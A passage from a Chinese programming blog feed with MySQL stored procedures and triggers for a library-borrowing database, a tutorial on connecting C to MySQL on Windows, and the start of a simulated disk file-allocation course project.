<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_BORROW&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_BORROW&#96;(IN PNO INT, IN BNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;借阅失败，库存不足或者编号错误！&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY - 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; BNO ;</span><br><span class="line">    INSERT INTO borrowings (BNO, PNO, BDATE, ISRETURN) </span><br><span class="line">    VALUES</span><br><span class="line">        (BNO, PNO, NOW(), 0) ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>归还：根据用户ID和书籍ID，修改记录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;TRY_RETURN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;TRY_RETURN&#96;(IN mPNO INT, IN mBNO INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;归还失败&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books,</span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        books.&#96;BINVENTORY&#96; &#x3D; (books.&#96;BINVENTORY&#96; + 1) </span><br><span class="line">    WHERE books.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 ;</span><br><span class="line">    UPDATE </span><br><span class="line">        borrowings </span><br><span class="line">    SET</span><br><span class="line">        borrowings.&#96;ISRETURN&#96; &#x3D; 1,</span><br><span class="line">        borrowings.&#96;RDATE&#96; &#x3D; NOW() </span><br><span class="line">    WHERE borrowings.&#96;BNO&#96; &#x3D; mBNO </span><br><span class="line">        AND borrowings.&#96;PNO&#96; &#x3D; mPNO </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0 </span><br><span class="line">    LIMIT 1 ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>入库：根据书商编号和书籍编号，将对应的书籍库存量进行修改</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP PROCEDURE IF EXISTS &#96;PUT_IN&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE DEFINER&#x3D;&#96;root&#96;@&#96;localhost&#96; PROCEDURE &#96;PUT_IN&#96;(IN mbno INT, IN msno INT, IN mnum INT)</span><br><span class="line">BEGIN</span><br><span class="line">    DECLARE EXIT HANDLER FOR SQLEXCEPTION </span><br><span class="line">    BEGIN</span><br><span class="line">        ROLLBACK ;</span><br><span class="line">        SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库失败,编号错误或者入库数量错误&#39; ;</span><br><span class="line">    END ;</span><br><span class="line">    START TRANSACTION ;</span><br><span class="line">    INSERT INTO warehousings (BNO, SNO, NUM) </span><br><span class="line">    VALUES</span><br><span class="line">        (mbno, msno, mnum) ;</span><br><span class="line">    UPDATE </span><br><span class="line">        books </span><br><span class="line">    SET</span><br><span class="line">        BINVENTORY &#x3D; (BINVENTORY + mnum) </span><br><span class="line">    WHERE BNO &#x3D; mbno ;</span><br><span class="line">    COMMIT ;</span><br><span class="line">END$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>触发器</p>
<p>​      由于<code>MySQL5.6</code>不支持<code>check</code>功能，因此需要通过触发器限制某些属性的值的范围。</p>
<ol>
<li><p>书籍数量必须是非负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_INSERT&#96; BEFORE INSERT ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;您输入的库存量不符合现实意义：&#39;;</span><br><span class="line">END IF;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_INVENTORY_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_INVENTORY_UPDATE&#96; BEFORE UPDATE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.BINVENTORY &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;新的的库存量不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍数量必须是非负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_INSERT&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_INSERT&#96; BEFORE INSERT ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 OR NEW.AGE &gt; 200 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;户年龄不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;USER_AGE_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;USER_AGE_UPDATE&#96; BEFORE UPDATE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF NEW.AGE &lt; 0 </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;新的用户年龄不符合现实意义：&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>用户删除之前需要归还所有书籍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PEOPLE_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PEOPLE_DELETE&#96; BEFORE DELETE ON &#96;users&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF EXISTS </span><br><span class="line">    (SELECT </span><br><span class="line">        * </span><br><span class="line">    FROM</span><br><span class="line">        borrowings </span><br><span class="line">    WHERE old.PNO &#x3D; borrowings.&#96;PNO&#96; </span><br><span class="line">        AND borrowings.&#96;ISRETURN&#96; &#x3D; 0) </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;该用户仍有未归还的书籍，无法删除&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书籍删除之前确保该书籍已归还完毕</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;BOOK_DELETE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;BOOK_DELETE&#96; BEFORE DELETE ON &#96;books&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">IF EXISTS (</span><br><span class="line">SELECT * FROM</span><br><span class="line">borrowings</span><br><span class="line">WHERE old.BNO &#x3D; borrowings.&#96;BNO&#96; AND borrowings.&#96;ISRETURN&#96; &#x3D; 0</span><br><span class="line">)</span><br><span class="line">THEN</span><br><span class="line">SIGNAL SQLSTATE &#39;HY000&#39; SET MESSAGE_TEXT &#x3D; &#39;该书籍仍有未归还的记录，无法删除&#39;;</span><br><span class="line">END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>书记入库数量不能是负数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;PUT_IN_STORAGE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;PUT_IN_STORAGE&#96; BEFORE INSERT ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW BEGIN</span><br><span class="line">    IF new.NUM &lt; 0 THEN</span><br><span class="line">    SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库量不能是负数&#39;;</span><br><span class="line">    END IF;</span><br><span class="line">    END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
<li><p>不能随便修改入库记录中的入库数量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line">USE &#96;bookbrdb&#96;$$</span><br><span class="line"></span><br><span class="line">DROP TRIGGER &#x2F;*!50032 IF EXISTS *&#x2F; &#96;WAREHOUSINGS_UPDATE&#96;$$</span><br><span class="line"></span><br><span class="line">CREATE</span><br><span class="line">    &#x2F;*!50017 DEFINER &#x3D; &#39;root&#39;@&#39;localhost&#39; *&#x2F;</span><br><span class="line">    TRIGGER &#96;WAREHOUSINGS_UPDATE&#96; BEFORE UPDATE ON &#96;warehousings&#96; </span><br><span class="line">    FOR EACH ROW </span><br><span class="line">BEGIN</span><br><span class="line">    IF new.NUM !&#x3D; old.NUM </span><br><span class="line">    THEN SIGNAL SQLSTATE &#39;45000&#39; SET MESSAGE_TEXT &#x3D; &#39;入库量不能随意修改&#39; ;</span><br><span class="line">    END IF ;</span><br><span class="line">END;</span><br><span class="line">$$</span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>用户权限设置</p>
<table>
<thead>
<tr>
<th><strong>用户</strong></th>
<th><strong>权限</strong></th>
</tr>
</thead>
<tbody><tr>
<td>root</td>
<td>对整个数据库bookbrdb拥有所有权</td>
</tr>
<tr>
<td>bookAdmin</td>
<td>对书籍表拥有所有权、借阅表有插入、选择、更新权</td>
</tr>
<tr>
<td>userAdmin</td>
<td>对用户表拥有所有权</td>
</tr>
<tr>
<td>booksellerAdmin</td>
<td>对书商表拥有所有权、入库表拥有插入权、选择权、书籍表有更新权</td>
</tr>
</tbody></table>
</li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>数据库</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows系统下C语言连接MySQL</title>
    <url>/2020/07/03/C%E8%AF%AD%E8%A8%80%E8%BF%9E%E6%8E%A5MySQL/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>高级语言连接数据库技术可谓十分成熟，但是使用C语言连接数据库还是挺少的，之前做数据库课程设计的时候刚好用到C语言连接数据库，因此就把这次过程记录下来。<a id="more"></a></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol>
<li>MySQL 5.6.48-64位</li>
<li>MinGW64 <ul>
<li>==假如你安装的MySQL是32位的，那么MinGW就需要安装32位版本的==</li>
</ul>
</li>
</ol>
<ul>
<li>Visual Studio Code（其他编辑器也可以，有条件的可以用记事本）</li>
</ul>
<h2 id="开始搭建环境"><a href="#开始搭建环境" class="headerlink" title="开始搭建环境"></a>开始搭建环境</h2><ul>
<li><p>配置<code>MinGW64</code>环境:</p>
<ul>
<li><p><a href="http://mingw.org/" target="_blank" rel="noopener">官网下载</a>或者<a href="https://q.yalexin.top/MinGW64.zip" target="_blank" rel="noopener">点此下载</a></p>
</li>
<li><p>假如是从这里下载的，将压缩文件解压到自定义位置，记住该位置</p>
</li>
<li><p>依次点击“此电脑”，“属性”，“高级系统设置”，“环境变量”，在系统变量中找到<code>Path</code>，增加一条记录，记录值是<code>MinGW64</code>安装路径下的<code>bin</code>文件夹</p>
<p><img src="https://q.yalexin.top/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%9B%BE.png" alt></p>
</li>
<li><p>在终端输入<code>gcc</code>时假如输出下面的语句就说明配置好了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc: fatal error: no input files</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>项目中引入库文件</p>
<ul>
<li><p>所在项目处新建文件夹<code>lib</code>，在<code>MySQL</code>的安装目录下的<code>lib</code>文件夹下找到<code>libmysql.dll</code>文件（我的是在<code>C:\Program Files\MySQL\MySQL Server 5.6\lib</code>文件夹下），将该文件复制到刚刚新建的<code>lib</code>文件夹中</p>
</li>
<li><p>在程序中加入头文件：</p>
<ul>
<li><code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>（该路径自己根据自己的情况进行相应更改）</li>
<li><code>#include &lt;winsock.h&gt;</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>例如我有一个数据库<code>test</code>，我要访问的是<code>stu</code>表：</p>
<p>在项目位置新建<code>main.c</code>文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * @Author: YaleXin</span></span><br><span class="line"><span class="comment"> * @Date: 2020-07-03 14:17:45</span></span><br><span class="line"><span class="comment"> * @LastEditTime: 2020-07-03 14:53:58</span></span><br><span class="line"><span class="comment"> * @LastEditors: YaleXin</span></span><br><span class="line"><span class="comment"> * @Description:</span></span><br><span class="line"><span class="comment"> * @FilePath: \my_c_workspace\DatabaseConnect\main.c</span></span><br><span class="line"><span class="comment"> * @祈祷不出现BUG</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HOST <span class="meta-string">"localhost"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 3306</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBNAME <span class="meta-string">"test"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TABLENAME <span class="meta-string">"stu"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"root"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASW <span class="meta-string">"123456"</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MYSQL mysql;</span><br><span class="line">    MYSQL_ROW row;</span><br><span class="line">    MYSQL_RES *res = (MYSQL_RES *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MYSQL_RES));</span><br><span class="line">    mysql_init(&amp;mysql);</span><br><span class="line">    <span class="keyword">if</span> (mysql_real_connect(&amp;mysql, HOST, USERNAME, PASW, DBNAME, PORT, <span class="literal">NULL</span>,</span><br><span class="line">                           CLIENT_FOUND_ROWS)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"ok!\n"</span>);</span><br><span class="line">        <span class="keyword">char</span> sql[<span class="number">50</span>] = <span class="string">""</span>;</span><br><span class="line">        <span class="comment">// 告知此次是gbk</span></span><br><span class="line">        mysql_set_character_set(&amp;mysql, <span class="string">"gbk"</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(sql, <span class="string">"SELECT * FROM %s"</span>, TABLENAME);</span><br><span class="line">        <span class="keyword">if</span> (mysql_real_query(&amp;mysql, sql, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">strlen</span>(sql))) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"查询失败,错误信息：%s"</span>, mysql_error(&amp;mysql));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res = mysql_store_result(&amp;mysql);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, <span class="string">"学号"</span>, <span class="string">"姓名"</span>);</span><br><span class="line">            <span class="keyword">while</span> ((row = mysql_fetch_row(res)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"|%-10s|%-10s|\n\n"</span>, row[<span class="number">0</span>], row[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            mysql_free_result(res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 关闭连接，避免浪费资源</span></span><br><span class="line">        mysql_close(&amp;mysql);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"登录失败！错误原因：%s\n是否退出：0：是，其他：否。\n"</span>,</span><br><span class="line">               mysql_error(&amp;mysql));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用命令行进行编译，进入该项目位置，打开命令终端，输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Iinclude -Llib main.c -llibmysql -o main</span><br></pre></td></tr></table></figure>

<p>如果足够幸运的话就会产生<code>main.exe</code>文件，运行该文件，输出：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ok!</span><br><span class="line">|学号      |姓名      |</span><br><span class="line"></span><br><span class="line">|1         |张三      |</span><br><span class="line"></span><br><span class="line">|2         |李四      |</span><br><span class="line"></span><br><span class="line">|3         |王五      |</span><br></pre></td></tr></table></figure>

<h2 id="可能遇到的问题"><a href="#可能遇到的问题" class="headerlink" title="可能遇到的问题"></a>可能遇到的问题</h2><ol>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">error: unknown type name 'SOCKET'</span><br><span class="line"><span class="meta"> #</span><span class="bash">define my_socket SOCKET</span></span><br></pre></td></tr></table></figure>

<p>加入头文件的顺序中，<code>#include &lt;winsock.h&gt;</code>需要在<code>#include &lt;C:\Program Files\MySQL\MySQL Server 5.6\include\mysql.h&gt;</code>上面</p>
</li>
<li><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">File format not recognized collect2.exe: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<p>不知道是不是因为安装的<code>MySQL</code>是64位，而编译器<code>MinGw</code>是32位造成的，我尝试用32位进行编译的时候会出现上面的错误，换了64位的就不会出现问题了。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>模拟设计磁盘文件的链接存储结构</title>
    <url>/2020/07/02/%E6%A8%A1%E6%8B%9F%E8%AE%BE%E8%AE%A1%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E7%9A%84%E9%93%BE%E6%8E%A5%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="课题要求"><a href="#课题要求" class="headerlink" title="课题要求"></a>课题要求</h2><ol>
<li><p>磁盘文件的管理采用显式链接结构，将文件占用的物理块号和链接指针记录 在一张文件分配表（<code>FAT</code>）中。文件第一块的块号记录在索引结点中。<a id="more"></a>文件目录 只记录文件名和索引结点的编号。索引结点的结构如下： </p>
<table>
<thead>
<tr>
<th>索引结点编号</th>
<th>文件属性</th>
<th>创建时间</th>
<th>文件第一块块号</th>
<th>文件占用盘块数</th>
<th>备用</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><p>假定磁盘存储空间共有 100 个物理块用于存放数据， 目录文件和索引结点可 直接访问，不存放在这 100 个块中。</p>
</li>
<li><p>一个物理块可存放 3 个文件逻辑记录，并且假设文件逻辑记录定长。</p>
</li>
<li><p>要求用键盘输入的方式模拟用户读写请求，菜单格式建议如下： </p>
<ul>
<li><code>Create（filename）</code> </li>
<li><code>Write（filename， text， logical_record_no）</code> </li>
<li><code>Read (filename, logical_record_no)</code> </li>
<li><code>Delete（filename）</code> 其中<code>filename</code>是要读写的文件名，<code>text</code> 是写入的内容，<code>logical_record_no</code>是逻辑 记录号。<code>Create</code>、<code>Write</code>、<code>Read</code>、<code>Delete</code>分别表示创建一个文件，向文件的某个逻 辑记录写，从文件的某个逻辑记录读，删除一个文件。 </li>
</ul>
</li>
<li><p>文件存储空间管理采用位示图（位示图为 7 行，16 列）的方式。 </p>
</li>
<li><p>要求程序可以打印<code>FAT</code>以及位示图的情况。 </p>
</li>
</ol>
<h2 id="结构设计"><a href="#结构设计" class="headerlink" title="结构设计"></a>结构设计</h2><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ul>
<li><p>结点项</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Inode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> firstBlockId;     <span class="comment">// 文件第一块块号</span></span><br><span class="line">    <span class="keyword">int</span> lastBlockId;      <span class="comment">// 文件最后一块块号</span></span><br><span class="line">    <span class="keyword">int</span> usedBlocksNum;    <span class="comment">// 文件占用的盘块数</span></span><br><span class="line">    <span class="keyword">time_t</span> createTime;    <span class="comment">// 文件创建时间</span></span><br><span class="line">    <span class="keyword">time_t</span> LastEditTime;  <span class="comment">// 文件上次修改时间</span></span><br><span class="line">    <span class="keyword">int</span> permission;       <span class="comment">// 文件权限</span></span><br><span class="line">    <span class="keyword">int</span> isDelete;         <span class="comment">// 该节点是否被标记“已删除”</span></span><br><span class="line">    <span class="keyword">char</span> standby[<span class="number">20</span>];     <span class="comment">// 备用</span></span><br><span class="line">&#125; Inode;</span><br></pre></td></tr></table></figure>
</li>
<li><p>目录项</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">listItem</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> fileName[<span class="number">256</span>];  <span class="comment">// 文件名字</span></span><br><span class="line">    <span class="keyword">int</span> nodeId;          <span class="comment">// 文件对应的结点编号</span></span><br><span class="line">&#125; listItem;</span><br></pre></td></tr></table></figure>
</li>
<li><p>物理盘块号</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Block</span> &#123;</span></span><br><span class="line">    <span class="comment">// 每一个物理块有三块逻辑记录号</span></span><br><span class="line">    <span class="keyword">char</span> firstLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> secondLogical[LOGICALSIZE];</span><br><span class="line">    <span class="keyword">char</span> thirdogical[LOGICALSIZE];</span><br><span class="line">&#125; Block;</span><br></pre></td></tr></table></figure>
</li>
<li><p>抽象磁盘</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Disk</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> FAT[BLOCKNUM];             <span class="comment">// 最多有BLOCKNUM个表项</span></span><br><span class="line">    <span class="keyword">int</span> bitmap[ROW][COL];          <span class="comment">// 示位图</span></span><br><span class="line">    listItem directory[BLOCKNUM];  <span class="comment">// 目录 最多有BLOCKNUM个目录项</span></span><br><span class="line">    Inode FDI[BLOCKNUM];  <span class="comment">// 索引结点集合 最多有BLOCKNUM个节点</span></span><br><span class="line">    <span class="keyword">int</span> fileNum;</span><br><span class="line">    Block blocks[BLOCKNUM];  <span class="comment">// 总的物理盘块数</span></span><br><span class="line">    <span class="keyword">int</span> freeBlock;           <span class="comment">// 空闲盘块数量</span></span><br><span class="line">&#125; Disk;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p>程序一开始将磁盘格式化，然后根据用户选择进行相关操作。</p>
<ul>
<li><p>创建文件：</p>
<p>首先申请一块空闲盘块（即默认一个文件初始占用一块盘块），同时将申请到的盘块记为“已使用”状态。</p>
<p>申请方式是：选定一个随机数作为“基址”，假如该盘块已被占用，尝试申请该“基址”的下一块，假若仍然被占用，则继续往后尝试………</p>
</li>
<li><p>读取文件：</p>
